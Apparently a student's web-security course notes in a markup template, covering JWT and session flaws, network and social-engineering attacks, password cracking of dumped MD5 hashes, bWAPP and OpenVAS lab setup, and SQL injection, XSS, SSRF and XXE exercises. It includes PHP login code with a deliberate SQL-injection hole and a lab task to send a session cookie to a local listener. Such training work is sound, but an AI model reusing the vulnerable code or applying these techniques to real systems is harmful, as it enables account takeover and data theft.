          Вразливості управліннями сесій
          * session Token Storage
          * Predictable tokens
          * JWT
          * Token disclosure
          * Cokkies flags
          * Cookie domain, path
          * Logout
          * Multiple sessions
          * Session fixation
          * Session expiration
          * Token Hijacking Mitigation
        
          Вразливості JWT токену
          * Failing to verify the signature
          * Allowing the None algorithm
          * Algorithm confusion
          * Using trivial secrets
          * kid parameter injections
          * Attacks using the jku header
        
          Різниця між cookie та JWT токенами
          📌 Вразливості JWT токену описані в
          https://www.invicti.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/
          https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
          https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities
        
          📌 Про різницю між cookie та JWT токенами
          https://medium.com/@prashantramnyc/difference-between-session-cookies-vs-jwt-json-web-tokens-for-session-management-4be67d2f066e
          https://developer.okta.com/blog/2022/02/08/cookies-vs-tokens
        
          Якщо коротко про різницю cookie та JWT токенами:
          * JWT, це шифрований user profile, який передають через клієнта, i потрібен він для: кластеризації за лоад-балансером, та авторизації, без звернення до бази/сервісу на кожен запит користувача.
          * Веб-токен JSON (JWT) — це відкритий стандарт, який визначає компактний i самодостатній спосіб безпечної передачі інформації між сторонами як об’єкт JSON. Цю інформацію можна перевірити та довіряти їй, оскільки вона має цифровий підпис. JWT можна підписати за допомогою секрету (з алгоритмом HMAC) або пари відкритих/приватних ключів за допомогою RSA або ECDSA.
        
          Декодер JWT
          https://jwt.io/
        
          Payloads_SecList
          https://github.com/danielmiessler/SecLists
        
          Payloads_oftheThings
          https://github.com/swisskyrepo/PayloadsAllTheThings
        
          Dynamic Application Security Testing (DAST)
          https://www.rapid7.com/fundamentals/dast/
        
          What is Dynamic Application Security Testing (DAST)
          https://www.opentext.com/what-is/dast
        
          HTTP methods: GET vs POST
          https://www.w3schools.com/tags/ref_httpmethods.asp
        
          Top 10 Web Application Security Risks
          https://owasp.org/www-project-top-ten/
        
          OWASP API top 10
          https://owasp.org/www-project-api-security/


          DNS-подмена, DNS-спуфинг (DNS spoofing) или отравление DNS-кэша (DNS Сache Poisoning) – это атака, во время которой некорректные данные внедряются в кэш DNS-преобразователя, то есть во временную базу данных операционной системы компьютера, в которой фиксируются недавние посещения некоторых веб-сайтов и доменов Интернет.
          После незаконного получения контроля над DNS-информацией жертвы злоумышленник может вносить в нее несанкционированные изменения. Такая ситуация носит название захвата домена (Domain Hijacking).
          Самым распространенным способом похищения доменного имени является изменение контактной электронной почты администратора, для этого используются методы социальной инженерии или излом учетной записи электронной почты администратора.
          Унифицированный указатель ресурса (URL, Uniform resource location) – это уникальный идентификатор для поиска определенного ресурса в сети Интернет. Перенаправление URL-адреса обычно является легитимным.
          К примеру, вы вошли на портал электронного обучения, чтобы начать курс Cybersecurity Essentials. Если вы выйдете из портала и вернетесь на него в другой раз, портал перенаправит вас обратно на страницу входа. 
          Конкретно таковой тип функциональности могут употреблять злоумышленники. Вместо того чтобы перенаправить вас на страницу входа электронного портала, они могут направить вас на вредоносный сайт.
          Для надлежащего функционирования сети необходимы и используются многие базовые технические службы, в частности, маршрутизация, адресация и именование доменов. Они являются основными целями при выполнении атак.
          Подмена (Spoofing) или отравление (Poisoning) – это атака путем Перевоплощения (имперсонификации), которая происходит за счет использования доверительных отношений между двумя системами.
          Подмена MAC-адреса производится в случае, когда злоумышленник маскирует свое устройство под реальное устройство сети и соответственно может обойти процесс аутентификации.
          При ARP-спуфинге через локальную сеть осуществляется отправка поддельных сообщений протокола ARP.
          При IP-спуфинге с целью маскировки осуществляется отправка IP-пакетов с подмененным адресом отправителя
          Сетевые устройства, подключаемые к сетевому коммутатору, для передачи и получения данных используют коммутацию пакетов. MAC Flooding компрометирует данные, передаваемые определенному устройству. Злоумышленник посылает в сеть большое количество сообщений с поддельными MAC-адресами, компрометируя безопасность сетевого коммутатора.
          В сети, подключенной к Интернету, DoS-атака вызывает проблемы с передачей данных за счет либо отправки сверхбольшого количества данных, либо отправки некорректно отформатированных пакетов, которые сеть не может обработать.
          DDoS-атака является результатом работы бот-сети инфицированных узлов, так называемых зомби-агентов. По готовности злоумышленник может подать команду системе управления ботнетом к началу DDoS-атаки.
          Атаки канального уровня (Layer 2 attacks) направлены в обход протоколов аутентификации на канальный уровень модели OSI, обеспечивающей передачу данных через физическую сеть 
          DNS-атаки направлены на уязвимость системы доменных имен и могут привести к непредсказуемой ее работе.
          Мошенническая точка доступа (Rogue Access Points) – это точка доступа, установленная без разрешения в защищенной сетевой инфраструктуре. Подключаюсь к сети. Беру МАС настоящего роутера себе.
          Атака "Злой двойник" (Evil Twin Attack) описывает ситуацию, когда точка доступа злоумышленника настроена так, чтобы выглядеть как лучший вариант подключения. После подключения пользователей к этой точке доступа злоумышленник может анализировать сетевой трафик и выполнить MitM-атаки.
          
          <dfn>Социальная инженерия</dfn> – это манипулирование лицом для побуждения его к выполнению определенных действий или разглашению конфиденциальной информации.<br>
          Атака вишинга, также известная как голосовой фишинг (Voice phishing), заключается в том, что злоумышленники используют технологии голосовой связи, чтобы побуждать пользователей разглашать определенную персональную информацию, например данные кредитной карты.
          Злоумышленники могут подменять телефонные звонки, осуществляемые с помощью протокола передачи голосовых сообщений через Интернет (VoIP, Voice over Internet Protocol), или оставить записанные сообщения для создания впечатления, что они являются легальными абонентами.
          Фарминг (Pharming) При атаке такого типа осуществляется умышленное перенаправление пользователя на поддельную версию официального веб-сайта. Поверив, что соединение выполнено на легальном веб-сайте, пользователь вводит свои учетные данные на мошенническом веб-сайте.
          Уэллинг, дословно охота на китов – это фишинговая атака целью которой являются высокопоставленные лица, в частности, топ-менеджеры организаций, политики, известные личности.
          Смешинг (SMiShing, Short Message Service phishing) – одна из тактик, которую злоумышленники используют для обмана пользователей. Поддельные текстовые сообщения побуждают пользователя посетить вредоносный веб-сайт или позвонить по телефону мошенника, что может привести к загрузке на устройство вредоносного программного обеспечения или к распространению личной информации.

          Cryptojacking (криптоджекинг) — тип кибератаки, который используется для получения криптовалюты.<br>
          crystalblockchain.com
          amlbot.com
          coinmarketcap
      
      //- encoded & hashing & ssh
      details
        summary encoded & hashing & ssh
        p.

          Завдання 1
        
          Це завдання має на меті отримати навички у декодуванні даних з base64. Також за допомогою утиліти file ви зможете дізнатись тип файлу. 
        
          Детальніше про магічні байти та як їх використовувати для атак можна почитати за посиланням 
          https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198
        
          * З текстового файлу відновити закодовані дані за допомогою команди base64, зберегти декодований вивід у файл. 
          * За допомогою команди file дізнатись що це за тип файлу. 
          * Відкрити декодований файл та надіслати фразу з кінцевого файлу – encoded.txt
        
          Завдання 2
        
          Це завдання імітує відтворення паролей з їх хешів за допомогою словника. 
        
          В якості алгоритму хешування виступає md5, який є застарілим та ненадійним. З сучасними алгоритмами хешування послідовність дій така ж сама, але обчислення займає набагато більше ресурсів, тому для демонстраційних цілей було обрано саме цей алгоритм.
        
          * Під час роботи з сайтом ви знайшли SQL-ін'єкцію. З цією вразливістю ви здампили таблицю users:
          +----+---------------+----------------------------------+
          | id | name          | password                         |
          +----+---------------+----------------------------------+
          |  1 | administrator | 2298e5616f2a76c2e7a86cef305a8f0c |
          |  2 | alicethefox   | 2e07a0bc2e80b76362cd738cf623a055 |
          |  3 | miketheminion | 6adeb5f54399cec7a7178e2d48adee94 |
          |  4 | sarahtheswan  | fa7667f3d3ebae421dbe05b988ac9b85 |
          |  5 | maxthemouse   | 43e0ab313ea599d05161f324cb5e038e |
          |  6 | lucythelion   | 8990559f2a374dac882527a86b2f6973 |
          |  7 | bobbythebear  | c3669daebe306fd8ce43643ce7aa3ae9 |
          |  8 | oliviatheowl  | 19570fa38b775a52176561f8f70965d1 |
          |  9 | rockythedog   | 316c33c6da18457d597efbcc3d33656d |
          | 10 | rosiethecat   | 0062e6ff5b471a4cb65ade906ca42049 |
          +----+---------------+----------------------------------+
          * Відновіть їх паролі за допомогою утиліти hashcat або john the ripper. 
          * В якості словника використовуйте rockyou
          https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
        
        
          Завдання 3
          У цьому завданні ви маєте ознайомитись з різними режимами в hashcat та зрозуміти що таке сіль і як вона працює при хешуванні.
        
          * Під час роботи з сайтом ви змогли здампити таблицю з бази даних:
          +----+---------------+----------------------------------+
          | id | name          | password                         |
          +----+---------------+----------------------------------+
          |  1 | administrator | 0f47165ddcd57bc81ab4c29f65f08c9e |
          |  2 | alicethefox   | 11a8b07ace8168c8630e529d7587b819 |
          |  3 | miketheminion | dc0ea26b7ce1e625d8202a4ca06136cd |
          |  4 | sarahtheswan  | d5bbca88a42402c1bfb29c22f586bf86 |
          |  5 | maxthemouse   | dfc788fa0d055f8e2a054e31a7b1fd34 |
          |  6 | lucythelion   | 70f2c284db6ec5c721473702193cf49e |
          |  7 | bobbythebear  | dfff7f44f820f2830308dd294233ad4d |
          |  8 | oliviatheowl  | 5a5c4f5f71b69dd071238bf5833a30ec |
          |  9 | rockythedog   | 080684243d95f14ba9dc64a93f04076c |
          | 10 | rosiethecat   | a37f32f41049a377795d106a4d5fd3ae |
          +----+---------------+----------------------------------+
          * Також в ході роботи з додатком ви змогли знайти наступний фрагмент коду:
          $password_salt="secureSalt###221";
        
          * Чи можете ви відтворити паролі цих користувачів? 
          * В якості словника використовуйте rockyou
          https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
        
          Завдання 4
          Зробіть пошук одного з ваших паролів у rockyou.txt, для цього скористуйтесь:
          cat rockyou.txt | grep mypassword
        
          Завдання 5
          * Створити пару ключів в SSH
          ssh-keygen -t rsa -C "mykey" -b 4096
        img(src="./img/web/Coding.png" alt="")
        img(src="./img/web/Hash.png" alt="")
        img(src="./img/web/Hash_.png" alt="")
        br
        p.
          bwapp & OpenVAS
          Інструкція по встановленню bwapp
          Встановлення bwapp (Bee-box VM installation)
          Завантажити, розпакувати та імпортувати вразливий додаток:
          https://download.vulnhub.com/bwapp/bee-box_v1.6.7z
        
          Змініть мережевий інтерфейс на Host-only
          В машині Kali Linux додайте ще один мережевий інтерфейс такого ж типу host-only adapter
        
          Запустіть імпортовану машину. Має завантажитись система.
        
          Відкрийте термінал та введіть команду ifconfig. Так ви дізнаєтесь ip адресу у host-only мережі.
        
          Далі з Kali машині перейдіть за цією адресою у браузері:
          Оберіть опцію bwapp. Авторизуйтесь за допомогою логіну bee та паролю bug.
          Встановлення openvas сканера:
          sudo apt update && sudo apt upgrade && sudo apt dist-upgrade
          sudo apt install openvas
          sudo gvm-setup
          *Займе багато часу
          sudo gvm-start
        
          Помилки при розгортанні bWAPP на віртуальній машині
          При розгортанні bWAPP на віртуальній машині за допомогою архіву (https://sourceforge.net/projects/bwapp/files/bWAPP/) на останніх версіях PHP може не працювати певний функціонал bWAPP (при виборі вразливості будуть відображатись пусті веб-сторінки).
          У такому випадку можна скачати готовий образ віртуальної машини за посиланням.
          https://sourceforge.net/projects/bwapp/files/bee-box/
        
          Даний образ розрахований на використання із ПЗ для віртуалізації VMWare (Workstation Player/Pro, Fusion) тому для імпорту цієї ВМ у VirtualBox спочатку потрібно її конвертувати у відповідний формат, який підтримується VirtualBox (.ovf).
        
          Для цього можна використати тулзу OVFTool (https://developer.vmware.com/web/tool/ovf/). Є версії як для Віндовз так і для Лінукс
          Після встановлення потрібно виконати наступну команду:
          * Якщо ovftool встановлено на Linux
          > ovftool /bee-box/bee-box.vmx ~/bee-box/bee-box.ovf
        
          * Якщо ovftool встановлено на Windows
          C:\Users\demo>C:\path\to\ovftool\ovftool.exe C:\bee-box\bee-box.vmx C:\bee-box\bee-box.ovf
        
          Потрібно правильно вказати шляхи до .vmx файлу. Далі імпортувати отриманий .ovf  файл у VirtualBox.
        
          Сканер OpenVAS. Помилки під час встановлення
          Після встановлення GVM(OpenVAS) по командам, які вказані у інструкції вище, а саме:
          sudo apt update && sudo apt upgrade && sudo apt dist-upgrade
          sudo apt install openvas
          sudo gvm-setup
          sudo gvm-start
        
          Далі при запуску сканера можлива поява помилок.
          Один із шляхів вирішення:
          sudo gvm-check-setup
          sudo runuser -u postgres -- /usr/share/gvm/create-postgresql-database
          sudo pg_lsclusters
          sudo apt install postgresql-16-pg-gvm
          sudo gvm-setup
        
          Таке можливо, якщо ви встановлювали openvas під користувачем root, а не шляхом використання sudo для поточного користувача у системі.
          Потрібно превірити овнера на файл /var/log/gvm/openvas.log, виконавши наступну команду:
          ls -la /var/log/gvmls -la /var/log/gvm
          Якщо там user/group owner root, то потрібно змінити на _gvm, виконавши наступну команду:
          sudo chown _gvm:_gvm /var/log/gvm/openvas.log
          Та перевірити, що овнер змінився:
          ls -la /var/log/gvm
          Після цього GVM (OpenVAS) повинен стартувати.
        
          Проблема 3: Failed to find config 'daba56c8-73ec-11df-a475-002264764cea
          Після встановлення сканера повинна пройти оновлення та синхронізація бази його сигнатур. Тому потрібно просто почекати ~30 хвилин так спробувати запускати скан знову.
        img(src="./img/web/Scan.png" alt="")
      
      //- Cryptographic Failures
      details
        summary Cryptographic Failures
        img(src="./img/web/RSA.png" alt="")
        img(src="./img/web/Шифр.png" alt="")
        img(src="./img/web/СиметрШифр.png" alt="")
        img(src="./img/web/АсиметрШифр.png" alt="")

      //- Injection
      details
        summary XML injection

        //- SQL injection
        details
          summary SQL injection
          p.
            SQL-инъекция - в поле ввода SQL-запрос
            Для запуску сервісу баз даних mysql
            systemctl start mysql
            
            Для запуску сервера apache2
            systemctl start apache2.service
            
            Для входу в додаток як адміністратор
            sudo mysql
            
            Створюємо нового користувача від імені якого будемо проводити маніпуляції з базою даних
            CREATE USER 'sqluser'@'localhost' IDENTIFIED BY 'new_password';
            CREATE DATABASE service;
            GRANT ALL PRIVILEGES ON `service`.* TO 'sqluser'@'localhost';
            FLUSH PRIVILEGES;
            
            Заходимо в базу даних щойно створеним акаунтом
            mysql -u sqluser -p
            new_password
            
            Перевіряємо чи доступна нам база даних service
            SHOW databases;
            USE service;
            
            Створюємо нову таблицю з користувачами
            CREATE TABLE service.user (
                id INT PRIMARY KEY,
                name VARCHAR(255),
                password VARCHAR(255)
            );
            
            Перевіряємо чи створилась таблиця
            show tables;
            
            Заповнюємо таблицю тестовими даними
            INSERT INTO service.user (id, name, password)
            VALUES
                (1, 'John', 'anypassword'),
                (2, 'Jane', 'secretpass'),
                (3, 'Mike', 'mypassword'),
                (4, 'Sarah', 'password123'),
                (5, 'David', 'pass123'),
                (6, 'Emily', 'abc123'),
                (7, 'Alex', 'qwerty'),
                (8, 'Olivia', 'letmein'),
                (9, 'Daniel', 'welcome'),
                (10, 'Sophia', 'testing');
            
            Перевіряємо чи створились дані
            select * from user;
            
            Вміст файлу index.php
            <?php
            // Database credentials
            $servername = "localhost";
            $username = "sqluser";
            $password = "new_password";
            $dbname = "service";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = $_POST["username"];
                $enteredPassword = $_POST["password"];
            
                // Query to check if the user exists
                $sql = "SELECT * FROM `user` WHERE name = '" . $enteredUsername . "' AND password = '" . $enteredPassword . "'";
            
                // Execute the query
                $result = $conn->query($sql);
            
                // Check if a row was returned
                if ($result->num_rows > 0) {
                    // User exists, display success message
                    echo "Welcome, " . $enteredUsername;
                } else {
                    // User doesn't exist, display error message
                    echo "Wrong credentials";
                }
            }
            
            // Close the database connection
            $conn->close();
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
            
                    <.label for="password">Password:<./label>
                    <.input type="text" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
            Вміст файлу index2.php
            <?php
            error_reporting(E_ALL);
            ini_set('display_errors', '1');
            // Database credentials
            $servername = "localhost";
            $username = "sql";
            $password = "password";
            $dbname = "test";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = $_POST["username"];
                $enteredPassword = $_POST["password"];
            
                // Query to check if the user exists
                $sql = "SELECT * FROM `user` WHERE name = '" . $enteredUsername . "' AND password = '" . $enteredPassword . "'";
            
                // Execute the query
                $result = $conn->query($sql);
            
                // Check for SQL error
                if (!$result) {
                    // Display the specific error message
                    echo "SQL Error: " . mysqli_error($conn);
                } else {
                    // Check if a row was returned
                    if ($result->num_rows > 0) {
                        // User exists, display success message
                        echo "Welcome, " . $enteredUsername;
                    } else {
                        // User doesn't exist, display error message
                        echo "Wrong credentials";
                    }
                }
            }
            
            // Close the database connection
            $conn->close();
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
                    <.label for="password">Password:<./label>
                    <.input type="text" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
                index3.php
            <?php
            // Database credentials
            $servername = "localhost";
            $username = "sqluser";
            $password = "new_password";
            $dbname = "service";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = sanitizeInput($_POST["username"]);
                $enteredPassword = sanitizeInput($_POST["password"]);
            
                // Prepare the SQL statement using a prepared statement
                $stmt = $conn->prepare("SELECT * FROM `user` WHERE name = ? AND password = ?");
                $stmt->bind_param("ss", $enteredUsername, $enteredPassword);
                $stmt->execute();
            
                // Fetch the result
                $result = $stmt->get_result();
            
                // Check if a row was returned
                if ($result->num_rows > 0) {
                    // User exists, display success message
                    echo "Welcome, " . $enteredUsername;
                } else {
                    // User doesn't exist, display error message
                    echo "Wrong credentials";
                }
            
                // Close the statement
                $stmt->close();
            }
            
            // Close the database connection
            $conn->close();
            
            // Function to sanitize user input
            function sanitizeInput($input) {
                // Remove leading and trailing whitespaces
                $input = trim($input);
                
                // Define a regular expression pattern to allow only alphanumeric characters and spaces
                $pattern = "/^[a-zA-Z0-9 ]*$/";
            
                // Check if the input matches the pattern
                if (!preg_match($pattern, $input)) {
                    die("You cannot use special characters in the field: " . $input);
                }
            
                return $input;
            }
            
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
            
                    <.label for="password">Password:<./label>
                    <.input type="password" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
            index4.php
            <?php
            // Database credentials
            $servername = "localhost";
            $username = "sqluser";
            $password = "new_password";
            $dbname = "service";
            
            // Create a database connection
            $conn = new mysqli($servername, $username, $password, $dbname);
            
            // Check if the connection was successful
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            // Check if the login form was submitted
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // Get the submitted username and password
                $enteredUsername = sanitizeInput($_POST["username"]);
                $enteredPassword = sanitizeInput($_POST["password"]);
            
                // Prepare the SQL statement using a prepared statement
                $stmt = $conn->prepare("SELECT * FROM `user` WHERE name = ? AND password = ?");
                $stmt->bind_param("ss", $enteredUsername, $enteredPassword);
                $stmt->execute();
            
                // Fetch the result
                $result = $stmt->get_result();
            
                // Check if a row was returned
                if ($result->num_rows > 0) {
                    // User exists, display success message
                    echo "Welcome, " . htmlentities($enteredUsername, ENT_QUOTES, 'UTF-8');
                } else {
                    // User doesn't exist, display error message
                    echo "Wrong credentials";
                }
            
                // Close the statement
                $stmt->close();
            }
            
            // Close the database connection
            $conn->close();
            
            // Function to sanitize user input
            function sanitizeInput($input) {
                // Remove leading and trailing whitespaces
                $input = trim($input);
                
                // Disallow certain HTML tags
                $input = strip_tags($input);
            
                // Define a regular expression pattern to allow only alphanumeric characters and spaces
                $pattern = "/^[a-zA-Z0-9 ]*$/";
            
                // Check if the input matches the pattern
                if (!preg_match($pattern, $input)) {
                    die("You cannot use special characters in the field: " . $input);
                }
            
                return $input;
            }
            ?>
            
            <.!DOCTYPE html>
            <.html>
            <.head>
                <.title>Login<./title>
            <./head>
            <.body>
                <.h1>Login<./h1>
                <.form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"], ENT_QUOTES, 'UTF-8'); ?>">
                    <.label for="username">Username:<./label>
                    <.input type="text" id="username" name="username" required>
            
                    <.label for="password">Password:<./label>
                    <.input type="password" id="password" name="password" required>
            
                    <.input type="submit" value="Login">
                <./form>
            <./body>
            <./html>
            
            Для автоматизації пошуку вразливостей
            sqlmap -r req.txt  --batch
            
            Reverse shell cheat sheet
            https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
            
            Інструмент, який полегшує створення Reverse Shell
            https://www.revshells.com/
            
            Корисні матеріали до SQL
            https://websec.ca/kb/sql_injection#MySQL_Reading_Files
            
            Завдання 1
            
            * За допомогою sqlmap проексплуатуйте ін'єкції в bWAPP у задачах "SQL Injection- Blind -Time-based", "SQL Injection- Blind-Boolean-based". 
            * Прикріпіть скріншоти, на яких видно з якими параметрами ви запускали sqlmap та список існуючих таблиць в базі.

          img(src="./img/web/SQL inj.png" alt="")
          img(src="./img/web/HTMLinj.png" alt="")
          img(src="./img/web/SSTI1.png" alt="")
          img(src="./img/web/SSTI2.png" alt="")
          a(href="https://book.hacktricks.xyz/pentesting-web/sql-injection") sql-injection <br>
          a(href="https://portswigger.net/web-security/sql-injection") sql-injection

        //- PHP injection
        details
          summary PHP injection

        //- XML injection
        details
          summary XML injection

        //- DLL injection
        details
          summary DLL injection
          p.
            Файл библиотеки динамических ссылок (DLL, Dynamic Link Library ) – это файл-библиотека, содержащая код и данные, необходимые для выполнения определенных действий в ОС Windows. необходимы для выполнения того или иного действия.
            DLL-инъекция позволяет киберпреступнику обманом заставить приложение вызвать вредоносный файл DLL и выполнить его как часть процесса-жертвы.
              
      //- XSS & ХХЕ
      details
        summary XSS & ХХЕ
        p.
          What is cross-site scripting (XSS)
          https://portswigger.net/web-security/cross-site-scripting
        
          Поради по скануванню XSS вразливості
          https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
        
          Завдання 1
          * Оберіть рівень складності low та перейдіть до задачі HTML injection GET. 
          * За допомогою html injection зробіть форму авторизації на сторінці. Ви маєте додати на сторінку форму з полями вводу логін та пароль а також кнопку, при натисканні на яку буде відправлятись запит на http://127.0.0.1/listener
          * Запустіть вебсервер, наприклад за допомогою команди python3 -m http.server 88 Продемонструйте, що на ваш сервер йде запит з вашої форми.
        
          Завдання 2
          * Оберіть рівень складності low та завдання XSS Reflected GET.
          * За допомогою ін'єкції XSS відправте значення кукі PHPSESSID на ваш сервер та додайте скріншот, де її значення приходить на ваш сервер.
        
          Завдання 3
          * Встановіть сканер openvas. 
          * Проскануйте bwapp хост за допомогою цього сканеру у режимі "Full and fast". 
          * Зробіть експорт знайдених вразливостей та додайте цей файл до дз.
        
          Завдання 4
          На основі даних з завдання №3 аргументуйте чому не можна розгортати цю систему не у приватній(закритій) мережі?
        
          Завдання 2
        
          * Надайте порівняльну характеристику атак типу XSS та SQL injection: що в них спільного, та чим відрізняються (причина/причини виникнення, методи усунення, на кого направлені). 
          * Не використовуйте готовий копіпаст з вікіпедії/ChatGPT
        
          Завдання 3
        
          * В bWAPP зробіть завдання Cross-site-scripting POST та Cross-site-scripting User-Agent. 
          * Ваша ціль вивести попап (alert) зі значенням поточного домену. 
          * Додайте скріншот з алертом та прикріпіть пейлоад, який викликав його спрацювання.
        
          етальніше про ХХЕ
          https://portswigger.net/web-security/xxe
        
          Як захиститись від ХХЕ (Prevention Cheat Sheet)
          https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

          Межсайтовый скриптинг (XSS, Cross-Site Scripting) – это распространенная уязвимость, которая встречается во многих веб-приложениях. Вот как это работает:
          Киберпреступники используют XSS-уязвимость, включая в веб-страницы сценарии, содержащие вредоносный код.
          Жертва открывает веб-страницу и злонамеренные скрипты скрыто передаются в ее браузер. 
          Вредоносный скрипт может получить доступ к любым файлам cookie, сессионным токенам или другой конфиденциальной информации о пользователе, и эти данные отправляются киберпреступнику.
          Получив эту информацию, киберпреступник может выдавать себя за пользователя.
        
        img(src="./img/web/DOMXSS.png" alt="")
        img(src="./img/web/enum.png" alt="")
        img(src="./img/web/enum_.png" alt="")
        img(src="./img/web/enum__.png" alt="")
        img(src="./img/web/RefXSS.png" alt="")
        img(src="./img/web/StoXSS.png" alt="")
        img(src="./img/web/XSS.png" alt="")
        img(src="./img/web/XSS_.png" alt="")
        img(src="./img/web/XXE.png" alt="")
        img(src="./img/web/XXE_.png" alt="")
        img(src="./img/web/XXE___.png" alt="")
      
      //- SSTI
      details
        summary SSTI
        p.
          Методолія Server side template injection
          https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

          Корисні Payloads для роботи з SSTI
          https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
      
      //- CSRF
      details
        summary CSRF
        p.
          Подделка межсайтовых запросов (CSRF, Cross-Site Request Forgery) – это случай злонамеренного использования веб-сайта, при котором из браузера пользователя в надежное веб-приложение передаются несанкционированные команды.
          Злонамеренный веб-сайт может передавать такие команды с помощью специально созданных тегов изображений, скрытых форм или JavaScript-запросов – все они могут работать без ведома пользователя.
        img(src="./img/web/CSRF.png" alt="")
      
      //- Identification and Authentication Failures
      details
        summary Identification and Authentication Failures
        img(src="./img/web/API.png" alt="")
        img(src="./img/web/API1.png" alt="")
        img(src="./img/web/API2.png" alt="")
        img(src="./img/web/API3.png" alt="")
        img(src="./img/web/API4.png" alt="")
        img(src="./img/web/APISec.png" alt="")
        img(src="./img/web/DIR.png" alt="")
        img(src="./img/web/DIR_.png" alt="")
        img(src="./img/web/DIR___.png" alt="")
        img(src="./img/web/JWT.png" alt="")
        img(src="./img/web/JWT_.png" alt="")
        img(src="./img/web/OAuth.png" alt="")
        img(src="./img/web/PKI.png" alt="")
        img(src="./img/web/SSO.png" alt="")

      //- SSRF
      details
        summary Server-Side Request Forgery
        p.
          Server-Side Request Forgery (SSRF) опис та протидія
          https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
        
          Корисні Payloads для роботи з SSRF_1
          https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
        
          Корисні Payloads для роботи з SSRF_2
          https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
        
          How AWS Instance Metadata Service Version 2 works
          https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html
        img(src="./img/web/attack.png" alt="")
        img(src="./img/web/SSRF1.png" alt="")
        img(src="./img/web/SSRF2.png" alt="")
        img(src="./img/web/SSRF3.png" alt="")
        img(src="./img/web/SSRF4.png" alt="")
        img(src="./img/web/SSRF5.png" alt="")
        img(src="./img/web/Sec/Sec1.png" alt="")
        img(src="./img/web/Sec/Sec2.png" alt="")
        img(src="./img/web/Sec/Sec3.png" alt="")
        img(src="./img/web/Sec/Sec4.png" alt="")
        img(src="./img/web/Sec/Sec5.png" alt="")
        img(src="./img/web/Sec/Sec6.png" alt="")
        img(src="./img/web/Sec/Sec7.png" alt="")
        img(src="./img/web/Sec/Sec8.png" alt="")
        img(src="./img/web/Sec/Sec9.png" alt="")
        img(src="./img/web/Sec/Sec10.png" alt="")
        img(src="./img/web/Sec/Sec11.png" alt="")
        img(src="./img/web/Sec/Sec12.png" alt="")
        img(src="./img/web/Sec/Sec13.png" alt="")
        img(src="./img/web/Sec/Sec14.png" alt="")
        img(src="./img/web/Sec/Sec15.png" alt="")
        img(src="./img/web/Sec/Sec16.png" alt="")
        img(src="./img/web/Sec/Sec17.png" alt="")
        img(src="./img/web/Sec/Sec18.png" alt="")
        img(src="./img/web/Sec/Sec19.png" alt="")
        img(src="./img/web/Sec/Sec20.png" alt="")
        img(src="./img/web/Sec/Sec21.png" alt="")
        img(src="./img/web/Sec/Sec22.png" alt="")
        img(src="./img/web/Sec/Sec23.png" alt="")
        img(src="./img/web/Sec/Sec24.png" alt="")
        img(src="./img/web/Sec/Sec25.png" alt="")
        img(src="./img/web/Sec/Sec26.png" alt="")
        img(src="./img/web/Sec/Sec27.png" alt="")
        img(src="./img/web/Sec/Sec28.png" alt="")
        img(src="./img/web/Sec/Sec29.png" alt="")
        img(src="./img/web/Sec/Sec30.png" alt="")

    //- Етапи
    details
      summary Етапи
      p.
        <em>Етапи етичного хакінгу:</em><br>
        - Reconnaissance (розвідка)<br>
        - Scanning & Enumeration (сканування)<br>
        - Gaining Access (отримання доступів)<br>
        - Maintaining Access (обслуговування доступів)<br>
        - Covering Tracks (приховання слідів)<br>

